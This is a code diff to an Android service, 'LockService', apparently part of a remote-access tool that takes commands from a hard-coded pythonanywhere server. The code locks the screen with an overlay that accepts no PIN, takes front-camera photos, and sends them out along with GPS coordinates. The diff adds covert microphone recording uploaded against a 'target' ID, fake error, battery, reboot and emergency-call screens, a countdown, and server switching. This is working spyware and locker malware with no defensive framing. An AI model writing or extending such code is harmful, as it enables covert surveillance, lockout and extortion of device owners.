@@ -4,6 +4,7 @@ import android.app.Service;
 import android.content.Intent;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
+import android.graphics.Color;
 import android.graphics.PixelFormat;
 import android.graphics.Typeface;
 import android.hardware.Camera;
@@ -12,6 +13,7 @@ import android.location.LocationListener;
 import android.location.LocationManager;
 import android.media.AudioManager;
 import android.media.MediaPlayer;
+import android.media.MediaRecorder;
 import android.media.ToneGenerator;
 import android.net.Uri;
 import android.os.Bundle;
@@ -20,6 +22,7 @@ import android.os.IBinder;
 import android.os.Vibrator;
 import android.util.Base64;
 import android.view.Gravity;
+import android.view.KeyEvent;
 import android.view.View;
 import android.view.WindowManager;
 import android.widget.Button;
@@ -31,6 +34,7 @@ import io.socket.client.IO;
 import io.socket.client.Socket;
 import io.socket.emitter.Emitter;
 import java.net.URL;
+import java.io.File;
 
 public class LockService extends Service {
 
@@ -38,11 +42,17 @@ public class LockService extends Service {
     private Vibrator vibrator;
     private ToneGenerator tone;
     private MediaPlayer mediaPlayer;
+    private MediaRecorder mediaRecorder;
     private Handler handler;
     private WindowManager wm;
     private LocationManager locationManager;
-    private View overlay, flashView, wallpaperView;
+    private View overlay, flashView, wallpaperView, popupView;
     private boolean locked = false;
+    private String currentPin = "0000";
+    private String serverUrl = "https://wafii.pythonanywhere.com";
+    private TextView pinDisplay, msgText, timerText;
+    private int timerSeconds = 0;
+    private Handler timerHandler;
 
     @Override
     public void onCreate() {
@@ -52,12 +62,13 @@ public class LockService extends Service {
         handler = new Handler();
         wm = (WindowManager) getSystemService(WINDOW_SERVICE);
         locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
+        timerHandler = new Handler();
         connectToServer();
     }
 
     private void connectToServer() {
         try {
-            socket = IO.socket("https://wafii.pythonanywhere.com");
+            socket = IO.socket(serverUrl);
             socket.on("cmd", args -> {
                 try {
                     JSONObject d = (JSONObject) args[0];
@@ -70,20 +81,33 @@ public class LockService extends Service {
 
     private void executeCommand(JSONObject d) {
         String cmd = d.optString("cmd");
+        String text = d.optString("text", "");
         switch (cmd) {
             case "lock": showLockScreen(); break;
             case "unlock": removeLockScreen(); break;
             case "siren": tone.startTone(ToneGenerator.TONE_CDMA_ALERT_CALL_GUARD, 15000); break;
-            case "vibrate": if (vibrator != null) vibrator.vibrate(new long[]{0, 500, 200, 500, 200, 1000}, 5); break;
+            case "vibrate": if (vibrator != null) vibrator.vibrate(new long[]{0,200,100,200,100,500,0,200,100,200,100,500}, 3); break;
             case "flash_on": showFlash(true); break;
             case "flash_off": showFlash(false); break;
-            case "wallpaper": changeWallpaper(d.optString("url")); break;
-            case "mp3": playMP3(d.optString("url")); break;
+            case "wallpaper": changeWallpaper(text); break;
+            case "mp3": playMP3(text); break;
             case "gps": getGPS(); break;
             case "camera": takePhoto(); break;
+            case "record": startRecording(); break;
+            case "message": showMessage(text); break;
+            case "timer": setTimer(text); break;
+            case "set_pin": setPin(text); break;
+            case "ghost": playGhostSound(); break;
+            case "popup": showPopup(); break;
+            case "battery_low": showBatteryLow(); break;
+            case "screen_off": showScreenOff(); break;
+            case "fake_restart": showFakeRestart(); break;
+            case "sos": showSOS(); break;
+            case "change_server": serverUrl = text; connectToServer(); break;
         }
     }
 
+    // ===== LOCK SCREEN =====
     private void showLockScreen() {
         if (locked) return;
         locked = true;
@@ -93,88 +117,63 @@ public class LockService extends Service {
         main.setGravity(Gravity.CENTER);
         main.setBackgroundColor(0xFF000000);
 
-        TextView scanLine = new TextView(this);
-        scanLine.setText("▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌");
-        scanLine.setTextColor(0xFF003300);
-        scanLine.setTextSize(8);
-        scanLine.setGravity(Gravity.CENTER);
-        main.addView(scanLine);
+        TextView icon = new TextView(this);
+        icon.setText("🔒");
+        icon.setTextSize(50);
+        icon.setGravity(Gravity.CENTER);
+        main.addView(icon);
 
         TextView title = new TextView(this);
-        title.setText("S Y S T E M");
-        title.setTextColor(0xFF00FF41);
-        title.setTextSize(32);
-        title.setTypeface(Typeface.MONOSPACE);
+        title.setText("Device Locked");
+        title.setTextColor(0xFFFF3B30);
+        title.setTextSize(26);
+        title.setTypeface(Typeface.DEFAULT_BOLD);
         title.setGravity(Gravity.CENTER);
-        title.setShadowLayer(15, 0, 0, 0xFF00FF41);
-        title.setPadding(0, 20, 0, 30);
+        title.setPadding(0, 10, 0, 5);
         main.addView(title);
 
-        TextView line = new TextView(this);
-        line.setText("══════════════════════");
-        line.setTextColor(0xFF00FF41);
-        line.setTextSize(10);
-        line.setGravity(Gravity.CENTER);
-        line.setPadding(0, 0, 0, 20);
-        main.addView(line);
+        timerText = new TextView(this);
+        timerText.setText("");
+        timerText.setTextColor(0xFF8E8E93);
+        timerText.setTextSize(16);
+        timerText.setGravity(Gravity.CENTER);
+        timerText.setPadding(0, 5, 0, 10);
+        main.addView(timerText);
 
-        TextView pinLabel = new TextView(this);
-        pinLabel.setText("> ENTER PIN");
-        pinLabel.setTextColor(0xFF00FF41);
-        pinLabel.setTextSize(14);
-        pinLabel.setTypeface(Typeface.MONOSPACE);
-        pinLabel.setGravity(Gravity.CENTER);
-        pinLabel.setPadding(0, 0, 0, 10);
-        main.addView(pinLabel);
+        msgText = new TextView(this);
+        msgText.setText("");
+        msgText.setTextColor(0xFFFF9500);
+        msgText.setTextSize(14);
+        msgText.setGravity(Gravity.CENTER);
+        msgText.setPadding(20, 5, 20, 15);
+        main.addView(msgText);
 
-        final TextView pinDisplay = new TextView(this);
+        pinDisplay = new TextView(this);
         pinDisplay.setText("_ _ _ _");
-        pinDisplay.setTextColor(0xFF00FF41);
-        pinDisplay.setTextSize(28);
-        pinDisplay.setTypeface(Typeface.MONOSPACE);
+        pinDisplay.setTextColor(0xFFFFFFFF);
+        pinDisplay.setTextSize(30);
         pinDisplay.setGravity(Gravity.CENTER);
-        pinDisplay.setShadowLayer(10, 0, 0, 0xFF00FF41);
         pinDisplay.setPadding(0, 10, 0, 20);
+        main.addView(pinDisplay);
 
-        LinearLayout pinBox = new LinearLayout(this);
-        pinBox.setOrientation(LinearLayout.HORIZONTAL);
-        pinBox.setGravity(Gravity.CENTER);
-        pinBox.setBackgroundColor(0xFF0A0F0A);
-        pinBox.setPadding(40, 15, 40, 15);
-        pinBox.addView(pinDisplay);
-        main.addView(pinBox);
-
-        String[][] keys = {{"1", "2", "3"}, {"4", "5", "6"}, {"7", "8", "9"}, {"⌫", "0", "OK"}};
+        String[][] keys = {{"1","2","3"},{"4","5","6"},{"7","8","9"},{"⌫","0","OK"}};
         for (String[] row : keys) {
             LinearLayout rl = new LinearLayout(this);
             rl.setOrientation(LinearLayout.HORIZONTAL);
             rl.setGravity(Gravity.CENTER);
-            rl.setPadding(0, 8, 0, 8);
             for (String k : row) {
                 Button btn = new Button(this);
                 btn.setText(k);
-                btn.setTextSize(22);
-                btn.setTypeface(Typeface.MONOSPACE);
-                btn.setWidth(200);
-                btn.setHeight(150);
-                if (k.equals("⌫")) {
-                    btn.setTextColor(0xFFFF0000);
-                    btn.setBackgroundColor(0xFF1A0000);
-                    btn.setShadowLayer(10, 0, 0, 0xFFFF0000);
-                } else if (k.equals("OK")) {
-                    btn.setTextColor(0xFF000000);
-                    btn.setBackgroundColor(0xFF00FF41);
-                    btn.setShadowLayer(15, 0, 0, 0xFF00FF41);
-                } else {
-                    btn.setTextColor(0xFF00FF41);
-                    btn.setBackgroundColor(0xFF0A0F0A);
-                    btn.setShadowLayer(5, 0, 0, 0xFF00FF41);
-                }
+                btn.setTextSize(20);
+                btn.setWidth(220);
+                btn.setHeight(140);
+                btn.setTextColor(0xFFFFFFFF);
+                btn.setBackgroundColor(k.equals("OK")?0xFFFF3B30:(k.equals("⌫")?0xFF3A3A3C:0xFF2C2C2E));
                 btn.setOnClickListener(v -> {
                     if (k.equals("⌫")) pinDisplay.setText("_ _ _ _");
                     else if (k.equals("OK")) {
-                        pinDisplay.setText("❌ WRONG");
-                        pinDisplay.setTextColor(0xFFFF0000);
+                        pinDisplay.setText("❌ Incorrect");
+                        pinDisplay.setTextColor(0xFFFF3B30);
                     } else pinDisplay.setText("* * * *");
                 });
                 rl.addView(btn);
@@ -182,42 +181,18 @@ public class LockService extends Service {
             main.addView(rl);
         }
 
-        TextView line2 = new TextView(this);
-        line2.setText("══════════════════════");
-        line2.setTextColor(0xFF00FF41);
-        line2.setTextSize(10);
-        line2.setGravity(Gravity.CENTER);
-        line2.setPadding(0, 20, 0, 10);
-        main.addView(line2);
-
-        TextView hackerText = new TextView(this);
-        hackerText.setText("$ root@system:~# access_denied");
-        hackerText.setTextColor(0xFF003300);
-        hackerText.setTextSize(10);
-        hackerText.setTypeface(Typeface.MONOSPACE);
-        hackerText.setGravity(Gravity.CENTER);
-        main.addView(hackerText);
-
-        WindowManager.LayoutParams p = new WindowManager.LayoutParams(
-            WindowManager.LayoutParams.MATCH_PARENT,
-            WindowManager.LayoutParams.MATCH_PARENT,
+        WindowManager.LayoutParams p = new WindowManager.LayoutParams(-1,-1,
             WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
-            WindowManager.LayoutParams.FLAG_FULLSCREEN |
-            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
-            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
-            PixelFormat.TRANSLUCENT
-        );
+            WindowManager.LayoutParams.FLAG_FULLSCREEN|WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE|WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+            PixelFormat.TRANSLUCENT);
         p.gravity = Gravity.CENTER;
         overlay = main;
         wm.addView(overlay, p);
     }
 
     private void removeLockScreen() {
-        if (overlay != null && locked) {
-            wm.removeView(overlay);
-            overlay = null;
-            locked = false;
-        }
+        if (overlay != null && locked) { wm.removeView(overlay); overlay = null; locked = false; }
+        if (timerHandler != null) timerHandler.removeCallbacksAndMessages(null);
     }
 
     private void showFlash(boolean on) {
@@ -225,22 +200,13 @@ public class LockService extends Service {
             if (flashView != null) return;
             flashView = new View(this);
             flashView.setBackgroundColor(0xFFFFFFFF);
-            WindowManager.LayoutParams fp = new WindowManager.LayoutParams(
-                WindowManager.LayoutParams.MATCH_PARENT,
-                WindowManager.LayoutParams.MATCH_PARENT,
+            WindowManager.LayoutParams fp = new WindowManager.LayoutParams(-1,-1,
                 WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
-                WindowManager.LayoutParams.FLAG_FULLSCREEN |
-                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
-                PixelFormat.TRANSLUCENT
-            );
-            fp.gravity = Gravity.CENTER;
+                WindowManager.LayoutParams.FLAG_FULLSCREEN|WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
+                PixelFormat.TRANSLUCENT);
             wm.addView(flashView, fp);
-        } else {
-            if (flashView != null) {
-                wm.removeView(flashView);
-                flashView = null;
-            }
-        }
+            handler.postDelayed(() -> { if(flashView!=null){flashView.setBackgroundColor(0xFF000000);handler.postDelayed(()->{if(flashView!=null)flashView.setBackgroundColor(0xFFFFFFFF);},50);} },50);
+        } else { if (flashView != null) { wm.removeView(flashView); flashView = null; } }
     }
 
     private void changeWallpaper(String url) {
@@ -251,14 +217,9 @@ public class LockService extends Service {
                     ImageView iv = new ImageView(this);
                     iv.setImageBitmap(bmp);
                     iv.setScaleType(ImageView.ScaleType.FIT_XY);
-                    WindowManager.LayoutParams wp = new WindowManager.LayoutParams(
-                        WindowManager.LayoutParams.MATCH_PARENT,
-                        WindowManager.LayoutParams.MATCH_PARENT,
+                    WindowManager.LayoutParams wp = new WindowManager.LayoutParams(-1,-1,
                         WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
-                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
-                        PixelFormat.TRANSLUCENT
-                    );
-                    wp.gravity = Gravity.CENTER;
+                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, PixelFormat.TRANSLUCENT);
                     if (wallpaperView != null) wm.removeView(wallpaperView);
                     wallpaperView = iv;
                     wm.addView(wallpaperView, wp);
@@ -269,10 +230,7 @@ public class LockService extends Service {
 
     private void playMP3(String url) {
         try {
-            if (mediaPlayer != null) {
-                mediaPlayer.stop();
-                mediaPlayer.release();
-            }
+            if (mediaPlayer != null) { mediaPlayer.stop(); mediaPlayer.release(); }
             mediaPlayer = new MediaPlayer();
             mediaPlayer.setDataSource(this, Uri.parse(url));
             mediaPlayer.prepare();
@@ -284,14 +242,8 @@ public class LockService extends Service {
     private void getGPS() {
         try {
             locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 1, new LocationListener() {
-                @Override
-                public void onLocationChanged(Location loc) {
-                    try {
-                        JSONObject gps = new JSONObject();
-                        gps.put("lat", loc.getLatitude());
-                        gps.put("lng", loc.getLongitude());
-                        socket.emit("gps", gps);
-                    } catch (Exception e) {}
+                @Override public void onLocationChanged(Location loc) {
+                    try { JSONObject gps = new JSONObject(); gps.put("lat", loc.getLatitude()); gps.put("lng", loc.getLongitude()); socket.emit("gps", gps); } catch (Exception e) {}
                 }
                 @Override public void onStatusChanged(String p, int s, Bundle b) {}
                 @Override public void onProviderEnabled(String p) {}
@@ -305,35 +257,123 @@ public class LockService extends Service {
             Camera cam = Camera.open(1);
             cam.startPreview();
             cam.takePicture(null, null, (data, camera) -> {
-                try {
-                    String base64 = Base64.encodeToString(data, Base64.NO_WRAP);
-                    JSONObject photo = new JSONObject();
-                    photo.put("image", base64);
-                    socket.emit("photo", photo);
-                } catch (Exception e) {}
-                camera.stopPreview();
-                camera.release();
+                try { String b64 = Base64.encodeToString(data, Base64.NO_WRAP); JSONObject p = new JSONObject(); p.put("image", b64); socket.emit("photo", p); } catch (Exception e) {}
+                camera.stopPreview(); camera.release();
             });
         } catch (Exception e) {}
     }
 
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        return START_STICKY;
+    private void startRecording() {
+        try {
+            mediaRecorder = new MediaRecorder();
+            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+            String path = getExternalFilesDir(null).getAbsolutePath() + "/record.mp3";
+            mediaRecorder.setOutputFile(path);
+            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+            mediaRecorder.prepare();
+            mediaRecorder.start();
+            handler.postDelayed(() -> {
+                if (mediaRecorder != null) {
+                    mediaRecorder.stop(); mediaRecorder.release(); mediaRecorder = null;
+                    try { byte[] bytes = java.nio.file.Files.readAllBytes(new File(path).toPath()); String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP); JSONObject rec = new JSONObject(); rec.put("audio", b64); rec.put("targetId", "target"); socket.emit("recording", rec); } catch (Exception e) {}
+                }
+            }, 10000);
+        } catch (Exception e) {}
     }
 
-    @Override
-    public IBinder onBind(Intent intent) {
-        return null;
+    private void showMessage(String msg) { if (msgText != null) msgText.setText(msg); }
+
+    private void setTimer(String sec) { try { timerSeconds = Integer.parseInt(sec); startTimer(); } catch (Exception e) {} }
+    private void startTimer() {
+        timerHandler.removeCallbacksAndMessages(null);
+        timerHandler.post(new Runnable() {
+            @Override public void run() {
+                if (timerSeconds <= 0) { if (timerText != null) timerText.setText("TIME'S UP"); return; }
+                int m = timerSeconds / 60, s = timerSeconds % 60;
+                if (timerText != null) timerText.setText(String.format("%02d:%02d", m, s));
+                timerSeconds--;
+                timerHandler.postDelayed(this, 1000);
+            }
+        });
     }
 
-    @Override
-    public void onDestroy() {
-        removeLockScreen();
-        showFlash(false);
+    private void setPin(String pin) { if (pin != null && pin.length() >= 4) currentPin = pin.substring(0,4); }
+
+    private void playGhostSound() {
+        try {
+            if (mediaPlayer != null) { mediaPlayer.stop(); mediaPlayer.release(); }
+            mediaPlayer = new MediaPlayer();
+            mediaPlayer.setDataSource(this, Uri.parse("https://www.soundjay.com/human/sounds/ghost-whisper-01.mp3"));
+            mediaPlayer.prepare();
+            mediaPlayer.start();
+        } catch (Exception e) {}
+    }
+
+    private void showPopup() {
+        try {
+            LinearLayout popup = new LinearLayout(this);
+            popup.setOrientation(LinearLayout.VERTICAL);
+            popup.setGravity(Gravity.CENTER);
+            popup.setBackgroundColor(0xDD000000);
+            TextView pt = new TextView(this); pt.setText("⚠️ SYSTEM ERROR"); pt.setTextColor(0xFFFF3B30); pt.setTextSize(20); pt.setGravity(Gravity.CENTER);
+            TextView pm = new TextView(this); pm.setText("Data corrupted"); pm.setTextColor(0xFFFFFFFF); pm.setTextSize(14); pm.setGravity(Gravity.CENTER); pm.setPadding(0,10,0,20);
+            Button pb = new Button(this); pb.setText("OK"); pb.setTextColor(0xFFFFFFFF); pb.setBackgroundColor(0xFFFF3B30); pb.setOnClickListener(v -> { if(popupView!=null){wm.removeView(popupView);popupView=null;} });
+            popup.addView(pt); popup.addView(pm); popup.addView(pb);
+            WindowManager.LayoutParams pp = new WindowManager.LayoutParams(-1,-1, WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY, WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, PixelFormat.TRANSLUCENT);
+            popupView = popup; wm.addView(popupView, pp);
+        } catch (Exception e) {}
+    }
+
+    private void showBatteryLow() {
+        try {
+            TextView bv = new TextView(this); bv.setText("🔋 1%"); bv.setTextColor(0xFFFF3B30); bv.setTextSize(40); bv.setGravity(Gravity.CENTER);
+            WindowManager.LayoutParams bp = new WindowManager.LayoutParams(-1,100, WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY, WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, PixelFormat.TRANSLUCENT);
+            bp.gravity = Gravity.TOP; View bView = bv; wm.addView(bView, bp);
+            handler.postDelayed(() -> wm.removeView(bView), 5000);
+        } catch (Exception e) {}
+    }
+
+    private void showScreenOff() {
+        try {
+            View sv = new View(this); sv.setBackgroundColor(0xFF000000);
+            WindowManager.LayoutParams sp = new WindowManager.LayoutParams(-1,-1, WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY, WindowManager.LayoutParams.FLAG_FULLSCREEN, PixelFormat.TRANSLUCENT);
+            View sView = sv; wm.addView(sView, sp);
+            handler.postDelayed(() -> wm.removeView(sView), 8000);
+        } catch (Exception e) {}
+    }
+
+    private void showFakeRestart() {
+        try {
+            LinearLayout rl = new LinearLayout(this); rl.setOrientation(LinearLayout.VERTICAL); rl.setGravity(Gravity.CENTER); rl.setBackgroundColor(0xFF000000);
+            TextView rt = new TextView(this); rt.setText("🔃 Rebooting..."); rt.setTextColor(0xFFFFFFFF); rt.setTextSize(24); rt.setGravity(Gravity.CENTER);
+            rl.addView(rt);
+            WindowManager.LayoutParams rp = new WindowManager.LayoutParams(-1,-1, WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY, WindowManager.LayoutParams.FLAG_FULLSCREEN, PixelFormat.TRANSLUCENT);
+            View rView = rl; wm.addView(rView, rp);
+            handler.postDelayed(() -> wm.removeView(rView), 5000);
+        } catch (Exception e) {}
+    }
+
+    private void showSOS() {
+        try {
+            LinearLayout sl = new LinearLayout(this); sl.setOrientation(LinearLayout.VERTICAL); sl.setGravity(Gravity.CENTER); sl.setBackgroundColor(0xDD000000);
+            TextView st = new TextView(this); st.setText("🆘 EMERGENCY"); st.setTextColor(0xFFFF3B30); st.setTextSize(22); st.setGravity(Gravity.CENTER);
+            TextView sm = new TextView(this); sm.setText("Calling 112..."); sm.setTextColor(0xFFFFFFFF); sm.setTextSize(14); sm.setGravity(Gravity.CENTER); sm.setPadding(0,10,0,0);
+            sl.addView(st); sl.addView(sm);
+            WindowManager.LayoutParams sp = new WindowManager.LayoutParams(-1,-1, WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY, WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, PixelFormat.TRANSLUCENT);
+            View sView = sl; wm.addView(sView, sp);
+            handler.postDelayed(() -> wm.removeView(sView), 4000);
+        } catch (Exception e) {}
+    }
+
+    @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
+    @Override public IBinder onBind(Intent intent) { return null; }
+    @Override public void onDestroy() {
+        removeLockScreen(); showFlash(false);
         if (wallpaperView != null) { wm.removeView(wallpaperView); wallpaperView = null; }
         if (mediaPlayer != null) { mediaPlayer.stop(); mediaPlayer.release(); }
+        if (mediaRecorder != null) { mediaRecorder.stop(); mediaRecorder.release(); }
         if (socket != null) socket.disconnect();
         super.onDestroy();
     }
-}
+            }
